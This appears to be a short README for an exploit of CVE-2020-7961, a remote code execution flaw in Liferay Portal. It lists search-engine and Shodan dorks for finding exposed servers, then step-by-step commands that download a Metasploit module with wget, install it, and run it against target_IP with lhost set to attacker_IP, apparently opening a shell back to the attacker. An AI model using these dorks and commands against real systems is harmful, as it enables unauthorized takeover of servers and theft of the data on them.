# CVE-2020-7961

![](https://img.shields.io/static/v1?label=Product&message=Liferay&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=prior%20to%207.2.1%20CE%20GA2&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)

See more details [here](https://www.synacktiv.com/publications/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc)
 - Google dork:
```
inurl:/api/jsonws
```
 - Shodan dork:
```
Powered+By+Liferay
```
 - [PublicWWW Link](https://publicwww.com/websites/Powered+By+Liferay/)

### Usage
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2020/Liferay_Portal_RCE/liferay_java_unmarshalling.rb
```
```
cp liferay_java_unmarshalling.rb /usr/share/metasploit-framework/modules/exploits/multi/http/
```
```
msfdb reinit; msfconsole -q
```
```
use exploits/multi/http/liferay_java_unmarshalling.rb
```
```
exploit(multi/http/liferay_java_unmarshalling) > set rhosts target_IP
exploit(multi/http/liferay_java_unmarshalling) > set lhost attacker_IP
exploit(multi/http/liferay_java_unmarshalling) > run
```
